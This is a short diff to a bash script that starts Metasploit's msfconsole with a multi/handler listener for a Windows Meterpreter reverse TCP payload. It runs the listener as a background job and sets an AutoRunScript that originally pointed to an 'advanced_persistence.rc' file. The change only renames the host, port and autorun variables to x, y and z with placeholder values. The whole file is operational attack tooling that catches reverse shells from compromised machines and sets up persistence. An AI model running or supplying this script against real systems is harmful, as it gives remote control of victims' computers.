@@ -1,14 +1,14 @@
 #!/bin/bash
 
-LHOST="ip"
-LPORT="port"
-AUTORUNSCRIPT="/cale/catre/advanced_persistence.rc"
+x="ip"
+y="port"
+z="autorunpath"
 
 msfconsole -q -x "
 use exploit/multi/handler;
 set payload windows/meterpreter/reverse_tcp;
-set LHOST $LHOST;
-set LPORT $LPORT;
-set AutoRunScript $AUTORUNSCRIPT;
+set LHOST $x;
+set LPORT $y;
+set AutoRunScript $z;
 exploit -j;
 "
